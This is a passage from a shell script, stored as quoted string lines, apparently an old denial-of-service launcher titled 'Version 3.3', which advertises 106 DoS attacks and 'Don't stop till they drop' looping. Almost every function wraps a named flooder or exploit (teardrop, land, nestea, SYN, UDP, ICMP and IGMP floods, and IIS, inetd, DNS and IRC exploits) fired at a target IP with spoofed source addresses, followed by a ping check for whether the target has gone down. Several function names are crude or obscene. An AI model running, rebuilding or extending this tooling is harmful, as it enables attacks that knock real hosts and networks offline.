            "echo \"        \\\"8A_-888  \\\"88_-888 \\\"8\\\"  \\\"88_-888 888-_L8\\\"   \\\"88_-\\\"   \\\"88_-\\\"  \\\"8\\\"\"",
            "echo \"                                         888                            \"",
            "echo \"       \\\"\\\"\\\"\\\"\\\"Y888888888888888888888888888 \\\"8\\\" 88888888beeeeeeeeeeee      \"",
            "echo \"    Version 3.3      \\\"\\\"\\\"\\\"\\\"\\\"\\\"Y888888888888eee888888888888888888888888ee  \"",
            "echo \"    * Multiple IP attacks      \\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"Y888888888888888888888888888P    \"",
            "echo \"    * Connection Watching                     \\\"\\\"\\\"\\\"\\\"\\\"\\\"Y888888888P        \"",
            "echo \"    * Looping attacks * \\\"Don't stop till they drop\\\"    \\\"\\\"\\\"\\\"\\\"\\\"           \"",
            "echo \"    * 106 DoS attacks * Line speed option * Portless attacks            \"",
            "echo \"    * Port range specification * Random source IP generation            \"",
            "echo \"    * \\\"Smart\\\" attacks * Continuous attacks * Simultaneous attacks\"",
            "echo \"    * Specific attacks\"",
            "echo \"    Scripted by: spender  e-mail: spender@exterminator.net              \"",
            "echo \"  !!!!!I take no responsibility for the actions taken by this script!!!!! \"",
            "sleep 2",
            "clear",
            "DONTSTOPPER () {",
            "        if [ $KEEPGOING -eq 0 ]; then",
            "\techo \"Continuing attack...he's not dead yet...\"",
            "\tCOUNTER1=1",
            "        OUTPUT=`cat ./output.txt -n | grep $COUNTER1 -w | cut -b8- | cut -d/ -f1`",
            "pingtest () {",
            "if [ $KEEPGOING -eq 0 ]; then",
            "ping=`ping -c3 $DESTIP | grep 100%`",
            "if [ \"$ping\" = \"3 packets transmitted, 0 packets received, 100% packet loss\" ]; then",
            "    dropcheck",
            "sexy () {",
            "if [ -f ./datapool.db ]; then",
            "    x2=0",
            "    SEXYATTACK=",
            "    while read LINE4",
            "\t    if [ \"$x2\" = \"1\" ]; then",
            "\t\tSEXYATTACK=\"$LINE4\"",
            "\t    fi",
            "\t    if [ \"$LINE4\" = \"$DESTIP\" ]; then",
            "\t\tx2=`expr $x2 + 1`",
            "\t    fi",
            "\tdone < \"./datapool.db\"",
            "    if  [ -n \"$SEXYATTACK\" ]; then",
            "\tSEXYRAN=1",
            "\t$SEXYATTACK",
            "    fi",
            "spender () {",
            "    echo \"Running SYN/UDP/ICMP attack (spender)...\"",
            "    ./bin/spender.pl $DESTIP $OUTPUT `expr 3000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"spender\"",
            "    pingtest",
            "simping () {",
            "    echo \"Running oversized ping attack (simping)...\"",
            "    ./bin/simping $DESTIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"simping\"",
            "    pingtest",
            "ircdkill () {",
            "    echo \"Running IRCd exploit (ircdkill)...\"",
            "    ./bin/ircd_kill $DESTIP $OUTPUT 1>/dev/null 2>&1",
            "    LASTATTACK=\"ircdkill\"",
            "    pingtest",
            "killinetd () {",
            "    echo \"Running inetd exploit (killinetd)...\"",
            "    ./bin/kill_inetd $DESTIP $OUTPUT $SCRIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"killinetd\"",
            "    pingtest",
            "locktcp () {",
            "    echo \"Running banner attack (locktcp)...\"",
            "    ./bin/locktcp $DESTIP $OUTPUT 1>/dev/null 2>&1 ; ./bin/locktcp $DESTIP $OUTPUT 1>/dev/null 2>&1",
            "    LASTATTACK=\"locktcp\"",
            "    pingtest",
            "octopus () {",
            "    echo \"Running port flooder (octopus)...\"",
            "    ./bin/octopus $DESTIP $OUTPUT 1>/dev/null 2>&1",
            "    LASTATTACK=\"octopus\"",
            "    pingtest",
            "hanson () {",
            "    echo \"Running mIRC attack (hanson)...\"",
            "    ./bin/hanson $DESTIP $OUTPUT 1>/dev/null 2>&1",
            "    LASTATTACK=\"hanson\"",
            "    pingtest",
            "akill2 () {",
            "    echo \"Running ascend router attack (akill2)...\"",
            "    perl ./bin/akill2.pl $DESTIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"akill2\"",
            "    pingtest",
            "dosprox () {",
            "    echo \"Running Universal Web Filter exploit (dosprox)...\"",
            "    perl ./bin/dos-prox.pl $DESTIP $OUTPUT 1>/dev/null 2>&1",
            "    LASTATTACK=\"dosprox\"",
            "    pingtest",
            "ADMdnsfuckr () {",
            "    echo \"Running DNS attack (ADMdnsfuckr)...\"",
            "    ./bin/ADMdnsfuckr $DESTIP 1>/dev/null 2>&1 & TEST=1 ; while [ $TEST -le `expr 15 \"*\" $LINESPEED` ] ; do  sleep 1 ; printf \".\" ; TEST=`expr $TEST + 1` ; done ; echo \"DONE!\" ; killall -9 -q ADMdnsfuckr 1>/dev/null 2>&1 ; killall -9 -w -q ADMdnsfuckr 1>/dev/null 2>&1",
            "    LASTATTACK=\"ADMdnsfuckr\"",
            "    pingtest",
            "hiperbomb2 () {",
            "    echo \"Running TCP attack (hiperbomb2)...\"",
            "    ./bin/hiperbomb2 $DESTIP `expr 60000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"hiperbomb2\"",
            "    pingtest",
            "ntdns () {",
            "    echo \"Running DNS attack (nt-dns)...\"",
            "    ./bin/nt-dns -s $SRCIP -d $DESTIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"ntdns\"",
            "    pingtest",
            "quake2 () {",
            "    echo \"Running Quake attack (quake2)...\"",
            "    ./bin/quake2 -s $DESTIP 27910 `expr 100 \"*\" $LINESPEED` 1>/dev/null 2>&1 ; rm -f ./core",
            "    LASTATTACK=\"quake2\"",
            "    pingtest",
            "rpk () {",
            "    echo \"Running RealServer attack (rpk)...\"",
            "    ./bin/rpk $SRCIP $DESTIP 1025 10000 1>/dev/null 2>&1",
            "    LASTATTACK=\"rpk\"",
            "    pingtest",
            "rwhokill () {",
            "    echo \"Running rwhod attack (rwhokill)...\"",
            "    ./bin/rwhokill $DESTIP `expr 20000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"rwhokill\"",
            "    pingtest",
            "tesoiis () {",
            "    echo \"Running IIS exploit (tesoiis)...\"",
            "    ./bin/tesoiis $DESTIP $OUTPUT \"/con/con\" 1>/dev/null 2>&1",
            "    LASTATTACK=\"tesoiis\"",
            "    pingtest",
            "paralyze3 () {",
            "    echo \"Running port flooder (paralyze3)...\"",
            "    ./bin/paralyze3 $DESTIP $OUTPUT -t `expr 50 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"paralyze3\"",
            "    pingtest",
            "d0s () {",
            "    echo \"Running SYN flooder (d0s.pl)...\"",
            "    perl ./bin/d0s.pl -i $DESTIP -p $OUTPUT -n `expr 5000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"d0s\"",
            "    pingtest",
            "flatline () {",
            "    echo \"Running IGMP/ICMP/UDP/TCP attack (flatline)...\"",
            "    ./bin/flatline -n `expr 5000 \"*\" $LINESPEED` $DESTIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"flatline\"",
            "    pingtest",
            "bncex () {",
            "    echo \"Running BNC exploit (bncex)...\"",
            "    ./bin/bncex $DESTIP $OUTPUT 1>/dev/null 2>&1",
            "    LASTATTACK=\"bncex\"",
            "    pingtest",
            "smack () {",
            "    echo \"Running ICMP attack (smack)...\"",
            "    ./bin/smack $DESTIP 1>/dev/null 2>&1 ; ./bin/smack $DESTIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"smack\"",
            "    pingtest",
            "binds () {",
            "    echo \"Running SGI named exploit (binds)...\"",
            "    ./bin/binds $SRCIP `expr $OUTPUT + 1` $DESTIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"binds\"",
            "    pingtest",
            "mailer () {",
            "    echo \"Running Mailer 4.3 exploit (mailer)...\"",
            "    ./bin/mailer $DESTIP $SRCIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"mailer\"",
            "    pingtest",
            "mmsudos () {",
            "    echo \"Running Microsoft Media Server exploit (mmsu-dos)...\"",
            "    ./bin/mmsu-dos $DESTIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"mmsudos\"",
            "    pingtest",
            "nestea2 () {",
            "    echo \"Running IP fragment attack (nestea2)...\"",
            "    ./bin/nestea2 $SRCIP $DESTIP $DESTIP -s $OUTPUT -t $OUTPUT -n `expr 300 \"*\" $LINESPEED` -q 1>/dev/null 2>&1",
            "    LASTATTACK=\"nestea2\"",
            "    pingtest",
            "comatose () {",
            "    echo \"Running ICMP flooder (comatose)...\"",
            "    ./bin/comatose $SRCIP $DESTIP `expr 10000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"comatose\"",
            "    pingtest",
            "hell () {",
            "    echo \"Running SYN flooder (hell)...\"",
            "    ./bin/hell $DESTIP $OUTPUT $OUTPUT 1>/dev/null 2>&1 & TEST=1 ; while [ $TEST -le `expr 15 \"*\" $LINESPEED` ] ; do  sleep 1 ; printf \".\" ; TEST=`expr $TEST + 1` ; done ; echo \"DONE!\" ; killall -9 -q hell 1>/dev/null 2>&1 ; killall -9 -w -q hell 1>/dev/null 2>&1",
            "    LASTATTACK=\"hell\"",
            "    pingtest",
            "laser () {",
            "    echo \"Running POP3 attack (laser)...\"",
            "    ./bin/laser $DESTIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"laser\"",
            "    pingtest",
            "linuxicmp () {",
            "    echo \"Running ICMP flooder (linux-icmp)...\"",
            "    ./bin/linux-icmp $DESTIP $OUTPUT 1>/dev/null 2>&1 & TEST=1 ; while [ $TEST -le `expr 15 \"*\" $LINESPEED` ] ; do sleep 1 ; printf \".\" ; TEST=`expr $TEST + 1` ; done ; echo \"DONE!\" ; killall -9 -q linux-icmp 1>/dev/null 2>&1 ; killall -9 -w -q linux-icmp 1>/dev/null 2>&1",
            "    LASTATTACK=\"linuxicmp\"",
            "    pingtest",
            "slice3 () {",
            "    echo \"Running TCP storm attack (slice3)...\"",
            "    ./bin/slice3 0 $DESTIP $OUTPUT $OUTPUT 1>/dev/null 2>&1 & TEST=1 ; while [ $TEST -le `expr 15 \"*\" $LINESPEED` ] ; do sleep 1 ; printf \".\" ; TEST=`expr $TEST + 1` ; done ; echo \"DONE!\" ; killall -9 -q slice3 1>/dev/null 2>&1 ; killall -9 -w -q slice3 1>/dev/null 2>&1",
            "    LASTATTACK=\"slice3\"",
            "    pingtest",
            "sprite () {",
            "    echo \"Running SYN flooder (sprite)...\"",
            "    ./bin/sprite 0 $DESTIP $OUTPUT $OUTPUT `expr 100 \"*\" $LINESPEED` 1>/dev/null 2>&1 & TEST=1 ; while [ $TEST -le `expr 15 \"*\" $LINESPEED` ] ; do sleep 1 ; printf \".\" ; TEST=`expr $TEST + 1` ; done ; echo \"DONE!\" ; killall -9 -q sprite 1>/dev/null 2>&1 ; killall -9 -w -q sprite 1>/dev/null 2>&1",
            "    LASTATTACK=\"sprite\"",
            "    pingtest",
            "stealth () {",
            "    echo \"Running UDP flooder (stealth)...\"",
            "    ./bin/stealth $DESTIP $OUTPUT 1>/dev/null 2>&1 & TEST=1 ; while [ $TEST -le `expr 15 \"*\" $LINESPEED` ] ; do sleep 1 ; printf \".\" ; TEST=`expr $TEST + 1` ; done ; echo \"DONE!\" ; killall -9 -q stealth 1>/dev/null 2>&1 ; killall -9 -w -q stealth 1>/dev/null 2>&1",
            "    LASTATTACK=\"stealth\"",
            "    pingtest",
            "ton () {",
            "    echo \"Running UDP flooder (ton)...\"",
            "    ./bin/ton -s $SRCIP -n `expr 400 \"*\" $LINESPEED` $DESTIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"ton\"",
            "    pingtest",
            "}   ",
            "cocksuck () {",
            "    echo \"Running SYN flooder (cocksuck)...\"",
            "    ./bin/cocksuck $DESTIP $OUTPUT `expr 10000 \"*\" $LINESPEED` $SRCIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"cocksuck\"",
            "    pingtest",
            "oshare () {",
            "    echo \"Running oshare packet flooder (oshare_1_gou)...\"",
            "    ./bin/oshare_1_gou $DESTIP `expr 20 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"oshare\"",
            "    pingtest",
            "gin () {",
            "    echo \"Running modem resetter (gin)...\"",
            "    ./bin/gin $SRCIP $DESTIP `expr 200 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"gin\"",
            "    pingtest",
            "hestra () {",
            "    echo \"Running ICMP/UDP flooder (hestra)...\"",
            "    ./bin/hestra $DESTIP $OUTPUT 1>/dev/null 2>&1 & TEST=1 ; while [ $TEST -le `expr 15 \"*\" $LINESPEED` ] ; do sleep 1 ; printf \".\" ; TEST=`expr $TEST + 1` ; done ; echo \"DONE!\" ; killall -9 -q hestra 1>/dev/null 2>&1 ; killall -9 -w -q hestra 1>/dev/null 2>&1",
            "    LASTATTACK=\"hestra\"",
            "    pingtest",
            "duy () {",
            "    echo \"Running ICMP/UDP flooder (duy)...\"",
            "    ./duy $DESTIP $OUTPUT 1>/dev/null 2>&1 & TEST=1 ; while [ $TEST -le `expr 15 \"*\" $LINESPEED` ] ; do sleep 1 ; printf \".\" ; TEST=`expr $TEST + 1` ; done ; echo \"DONE!\" ; killall -9 -q duy 1>/dev/null 2>&1 ; killall -9 -w -q duy 1>/dev/null 2>&1",
            "    LASTATTACK=\"duy\"",
            "    pingtest",
            "ruc () {",
            "    echo \"Running TCP storm attack (ruc)...\"",
            "    ./bin/ruc $DESTIP $OUTPUT 1>/dev/null 2>&1 & TEST=1 ; while [ $TEST -le `expr 15 \"*\" $LINESPEED` ] ; do sleep 1 ; printf \".\" ; TEST=`expr $TEST + 1` ; done ; echo \"DONE!\" ; killall -9 -q ruc 1>/dev/null 2>&1 ; killall -9 -w -q ruc 1>/dev/null 2>&1 ; rm -f ./ruckuS.log",
            "    LASTATTACK=\"ruc\"",
            "    pingtest",
            "dosfrontpage () {",
            "    echo \"Running FrontPage DoS (DoS.frontpage)...\"",
            "    perl ./bin/DoS.frontpage.pl $DESTIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"dosfrontpage\"",
            "    pingtest",
            "jaypee () {",
            "    echo \"Running Windows attack (jaypee)...\"",
            "    ./bin/jaypee $DESTIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"jaypee\"",
            "    pingtest",
            "udpflood () {",
            "    echo \"Running UDP flooder (udpflood)...\"",
            "    ./bin/udpflood $SRCIP $DESTIP `expr 30000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"udpflood\"",
            "    pingtest",
            "rcon () {",
            "    echo \"Running Quake server exploit (rcon)...\"",
            "    ./bin/rcon $DESTIP \"say Die Fucker!\" $OUTPUT 1>/dev/null 2>&1",
            "    LASTATTACK=\"rcon\"",
            "    pingtest",
            "arnup100 () {",
            "    echo \"Running UDP datagram attack (arnup100)...\"",
            "    ./bin/arnup100 \"127.0.0.1\" 19 $DESTIP 7 1>/dev/null 2>&1",
            "    LASTATTACK=\"arnup100\"",
            "    pingtest",
            "onetwothreefour () {",
            "    echo \"Running ICMP attack (1234)...\"",
            "    ./bin/1234 $SRCIP $DESTIP `expr 4000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"onetwothreefour\"",
            "    pingtest",
            "opentear () {",
            "    echo \"Running UDP attack (opentear)...\"",
            "    ./bin/opentear $DESTIP 0 0 1>/dev/null 2>&1 & TEST=1 ; while [ $TEST -le `expr 15 \"*\" $LINESPEED` ] ; do sleep 1 ; printf \".\" ; TEST=`expr $TEST + 1` ; done ; echo \"DONE!\" ; killall -9 -q opentear 1>/dev/null 2>&1 ; killall -9 -w -q opentear 1>/dev/null 2>&1",
            "    LASTATTACK=\"opentear\"",
            "    pingtest",
            "raped () {",
            "    echo \"Running TCP storm attack (raped)...\"",
            "    ./bin/raped $DESTIP $OUTPUT 1>/dev/null 2>&1 & TEST=1 ; while [ $TEST -le `expr 15 \"*\" $LINESPEED` ] ; do sleep 1 ; printf \".\" ; TEST=`expr $TEST + 1` ; done ; echo \"DONE!\" ; killall -9 -q raped 1>/dev/null 2>&1 ; killall -9 -w -q raped 1>/dev/null 2>&1",
            "    LASTATTACK=\"raped\"",
            "    pingtest",
            "stream () {",
            "    echo \"Running TCP storm attack (stream)...\"",
            "    ./bin/stream $DESTIP $OUTPUT 0 1>/dev/null 2>&1 & TEST=1 ; while [ $TEST -le `expr 15 \"*\" $LINESPEED` ] ; do sleep 1 ; printf \".\" ; TEST=`expr $TEST + 1` ; done ; echo \"DONE!\" ; killall -9 -q stream 1>/dev/null 2>&1 ; killall -9 -w -q stream 1>/dev/null 2>&1",
            "    LASTATTACK=\"stream\"",
            "    pingtest",
            "doslinux () {",
            "    echo \"Running ICMP attack (DoS-Linux)...\"",
            "    perl bin/DoS-Linux.pl -t $DESTIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"doslinux\"",
            "    pingtest",
            "ascendfoo () {",
            "    echo \"Running ICMP echo attack (ascend-foo)...\"",
            "    ./bin/ascend-foo $DESTIP 64 1>/dev/null 2>&1",
            "    LASTATTACK=\"ascendfoo\"",
            "    pingtest",
            "beer () {",
            "    echo \"Running general attack (beer)...\"",
            "    ./bin/beer $DESTIP `expr 1000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"beer\"",
            "    pingtest",
            "biffit () {",
            "    echo \"Running UDP attack (biffit)...\"",
            "    ./bin/biffit $DESTIP root 1>/dev/null 2>&1",
            "    LASTATTACK=\"biffit\"",
            "    pingtest",
            "bloop () {",
            "    echo \"Running ICMP flooder (bloop)...\"",
            "    ./bin/bloop $SRCIP $DESTIP `expr 10000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"bloop\"",
            "    pingtest",
            "boink () {",
            "    echo \"Running IP fragment attack (boink)...\"",
            "    ./bin/boink $SRCIP $DESTIP $OUTPUT $OUTPUT `expr 500 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"boink\"",
            "    pingtest",
            "bonk () {",
            "    echo \"Running IP fragment attack (bonk)...\"",
            "    ./bin/bonk $SRCIP $DESTIP `expr 8000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"bonk\"",
            "    pingtest",
            "coke () {",
            "    echo \"Running UDP flooder (coke)...\"",
            "    ./bin/coke $DESTIP `expr 10000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"coke\"",
            "    pingtest",
            "conseal () {",
            "    echo \"Running Conseal PC firewall attack...\"",
            "    ./bin/conseal $DESTIP `expr 10000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"conseal\"",
            "    pingtest",
            "echok () {",
            "    echo \"Running ICMP ping flooder (echok)...\"",
            "    ./bin/echok -f -n `expr 10000 \"*\" $LINESPEED` -w 1 $SRCIP $DESTIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"echok\"",
            "    pingtest",
            "fawx () {",
            "    echo \"Running IGMP attack (fawx)...\"",
            "    ./bin/fawx $SRCIP $DESTIP `expr 4000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"fawx\"",
            "    pingtest",
            "foqerc () {",
            "    echo \"Running flooder (foqerc)...\"",
            "    ./bin/foqerc $DESTIP root 1>/dev/null 2>&1",
            "    LASTATTACK=\"foqerc\"",
            "    pingtest",
            "galt_gin () {",
            "    echo \"Running modem resetter (galt_gin)...\"",
            "    ./bin/galt_gin -m ATDT411 $DESTIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"galt_gin\"",
            "    pingtest",
            "gewse () {",
            "    echo \"Running identd flooder (gewse)...\"",
            "    ./bin/gewse $DESTIP `expr 100 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"gewse\"",
            "    pingtest",
            "gewse5 () {",
            "    echo \"Running identd flooder (gewse5)...\"",
            "    ./bin/gewse5 $DESTIP `expr 100 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"gewse5\"",
            "    pingtest",
            "jolt () {",
            "    echo \"Running IP fragment attack (jolt)...\"",
            "    ./bin/jolt $DESTIP $SRCIP `expr 100 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"jolt\"",
            "    pingtest",
            "kkill () {",
            "    echo \"Running inetd flooder (kkill)...\"",
            "    ./bin/kkill $DESTIP $OUTPUT 1>/dev/null 2>&1 & TEST=1 ; while [ $TEST -le `expr 15 \"*\" $LINESPEED` ] ; do sleep 1 ; printf \".\" ; TEST=`expr $TEST + 1` ; done ; echo \"DONE!\" ; killall -9 kkill 1>/dev/null 2>&1 ; killall -9 -w kkill 1>/dev/null 2>&1",
            "    LASTATTACK=\"kkill\"",
            "    pingtest",
            "koc () {",
            "    echo \"Running IGMP attack (koc)...\"",
            "    ./bin/koc $DESTIP -p $OUTPUT -t `expr 1000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"koc\"",
            "    pingtest",
            "kod () {",
            "    echo \"Running IGMP attack (kod)...\"",
            "    ./bin/kod $DESTIP -p $OUTPUT -t `expr 30 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"kod\"",
            "    pingtest",
            "kox () {",
            "    echo \"Running IGMP attack (kox)...\"",
            "    ./bin/kox $DESTIP `expr 1000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"kox\"",
            "    pingtest",
            "inetddos () {",
            "    echo \"Running inetd attack (inetd.DoS)...\"",
            "    ./bin/inetd.DoS $DESTIP $OUTPUT `expr 100 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"inetddos\"",
            "    pingtest",
            "land () {",
            "    echo \"Running TCP exploit attack (land)...\"",
            "    ./bin/land $DESTIP $OUTPUT 1>/dev/null 2>&1",
            "    LASTATTACK=\"land\"",
            "    pingtest",
            "latierra () {",
            "    echo \"Running TCP exploit attack (La Tierra)...\"",
            "    ./bin/latierra -i $DESTIP -b $OUTPUT -e $OUTPUT -p 6 -m 4 -t f -o 1 -l `expr 2 \"*\" $LINESPEED` 1>/dev/null 2>&1 ; ./bin/latierra -i $DESTIP -b $OUTPUT -e $OUTPUT -p 6 -m 4 -t s -o 1 -l `expr 2 \"*\" $LINESPEED` 1>/dev/null 2>&1 ; ./bin/latierra -i $DESTIP -b $OUTPUT -e $OUTPUT -p 17 -m 4 -t a -o 1 -l `expr 2 \"*\" $LINESPEED` 1>/dev/null 2>&1 ; ./bin/latierra -i $DESTIP -b $OUTPUT -e $OUTPUT -p 17 -m 4 -t r -o 1 -l `expr 2 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"latierra\"",
            "    pingtest",
            "misfrag () {",
            "    echo \"Running TCP fragment attack (misfrag)...\"",
            "    ./bin/misfrag $SRCIP $OUTPUT $DESTIP $OUTPUT `expr 4000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"misfrag\"",
            "    pingtest",
            "moyari13 () {",
            "    echo \"Running ICMP attack (moyari13)...\"",
            "    ./bin/moyari13 $DESTIP `expr 5000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"moyari13\"",
            "    pingtest",
            "mutilate () {",
            "    echo \"Running port flooder (mutilate)...\"",
            "    ./bin/mutilate $DESTIP $OUTPUT 1>/dev/null 2>&1 ; ./bin/mutilate $DESTIP $OUTPUT 1>/dev/null 2>&1",
            "    LASTATTACK=\"mutilate\"",
            "    pingtest",
            "nestea () {",
            "    echo \"Running IP fragment attack (nestea)...\"",
            "    ./bin/nestea $SRCIP $DESTIP -s $OUTPUT -t $OUTPUT -n `expr 500 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"nestea\"",
            "    pingtest",
            "newtear () {",
            "    echo \"Running IP fragment attack (newtear)...\"",
            "    ./bin/newtear $SRCIP $DESTIP -s $OUTPUT -t $OUTPUT -n `expr 500 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"newtear\"",
            "    pingtest",
            "teardrop () {",
            "    echo \"Running IP fragment attack (teardrop)...\"",
            "    ./bin/teardrop $SRCIP $DESTIP -s $OUTPUT -t $OUTPUT -n `expr 100 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"teardrop\"",
            "    pingtest",
            "orgasm () {",
            "    echo \"Running port flooder (orgasm)...\"",
            "    ./bin/orgasm $DESTIP $OUTPUT $OUTPUT `expr 100 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"orgasm\"",
            "    pingtest",
            "overdrop () {",
            "    echo \"Running IP fragment attack (overdrop)...\"",
            "    ./bin/overdrop $DESTIP -n `expr 500 \"*\" $LINESPEED` -s $SRCIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"overdrop\"",
            "    pingtest",
            "pepsi () {",
            "    echo \"Running UDP flooder (pepsi)...\"",
            "    ./bin/pepsi -s $SRCIP -n `expr 20000 \"*\" $LINESPEED` $DESTIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"pepsi\"",
            "    pingtest",
            "pimp () {",
            "    echo \"Running IGMP attack (pimp)...\"",
            "    ./bin/pimp $DESTIP `expr 3000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"pimp\"",
            "    pingtest",
            "pimp2 () {",
            "    echo \"Running IGMP attack (pimp2)...\"",
            "    ./bin/pimp2 $DESTIP `expr 3000 \"*\" $LINESPEED` $SRCIP 31 1 1>/dev/null 2>&1",
            "    LASTATTACK=\"pimp2\"",
            "    pingtest",
            "pirchslap () {",
            "    echo \"Running pirchirc exploit (pirchslap)...\"",
            "    ./bin/pirchslap $DESTIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"pirchslap\"",
            "    pingtest",
            "pong () {",
            "    echo \"Running ICMP flooder (pong)...\"",
            "    ./bin/pong -fV -c `expr 10000 \"*\" $LINESPEED` $DESTIP $SRCIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"pong\"",
            "    pingtest",
            "}       ",
            "rape () {",
            "    echo \"Running flooder (rape)...\"",
            "    ./bin/rape $DESTIP $OUTPUT `expr 20000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"rape\"",
            "    pingtest",
            "rc8 () {",
            "    echo \"Running UDP flooder (rc8)...\"",
            "    ./bin/rc8 $SRCIP $DESTIP `expr 20000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"rc8\"",
            "    pingtest",
            "spiffit () {",
            "    echo \"Running UDP attack (spiffit)...\"",
            "    ./bin/spiffit $SRCIP $DESTIP $DESTIP root `expr 100 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"spiffit\"",
            "    pingtest",
            "stuffit () {",
            "    echo \"Running ping attack (stuffit)...\"",
            "    ping $DESTIP -f -s 1024 -p 7e 1>/dev/null 2>&1 & TEST=1 ; while [ $TEST -le `expr 15 \"*\" $LINESPEED` ] ; do sleep 1 ; printf \".\" ; TEST=`expr $TEST + 1` ; done ; echo \"DONE!\" ; killall -9 -q ping 1>/dev/null 2>&1 ; killall -9 -w -q ping 1>/dev/null 2>&1",
            "    LASTATTACK=\"stuffit\"",
            "    pingtest",
            "ssping () {",
            "    echo \"Running oversized ping attack (ssping)...\"",
            "    ./bin/ssping $SRCIP $DESTIP `expr 100 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"ssping\"",
            "    pingtest",
            "syndrop () {",
            "    echo \"Running TCP SYN attack (syndrop)...\"",
            "    ./bin/syndrop $SRCIP $DESTIP -s $OUTPUT -t $OUTPUT -n `expr 10000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"syndrop\"",
            "    pingtest",
            "syndropnone () {",
            "    echo \"Running TCP SYN attack (syndrop)...\"",
            "    ./bin/syndrop $SRCIP $DESTIP -n `expr 10000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"syndropnone\"",
            "    pingtest",
            "synful () {",
            "    echo \"Running SYN flooder (synful)...\"",
            "    ./bin/synful $DESTIP $OUTPUT `expr 10000 \"*\" $LINESPEED` 1>/dev/null 2>&1 ; ./bin/synful $DESTIP 1>/dev/null 2>&1",
            "    LASTATTACK=\"synful\"",
            "    pingtest",
            "synfulnone () {",
            "    echo \"Running SYN flooder (synful)...\"",
            "    ./bin/synful $DESTIP - `expr 10000 \"*\" $LINESPEED` 1>/dev/null 2>&1 ; ./bin/synful $DESTIP - `expr 10000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"synfulnone\"",
            "    pingtest",
            "synhose () {",
            "    echo \"Running SYN flooder (synhose)...\"",
            "    ./bin/synhose $DESTIP $OUTPUT `expr 10000 \"*\" $LINESPEED` 1>/dev/null 2>&1",
            "    LASTATTACK=\"synhose\"",
            "    pingtest",
            "synk () {",
            "    echo \"Running SYN flooder (synk)...\"",
            "    ./bin/synk 0 $DESTIP $OUTPUT $OUTPUT `expr 35 \"*\" $LINESPEED` 1>/dev/null 2>&1     ",
            "    LASTATTACK=\"synk\"",
            "    pingtest",
            "synk4 () {",
            "    echo \"Running SYN flooder (synk4)...\"",
            "    ./bin/synk4 0 $DESTIP $OUTPUT $OUTPUT `expr 45 \"*\" $LINESPEED` 1>/dev/null 2>&1    ",
            "    LASTATTACK=\"synk4\"",
            "    pingtest",
            "targa () {",
            "    echo \"Running combo attack (targa)...\"",
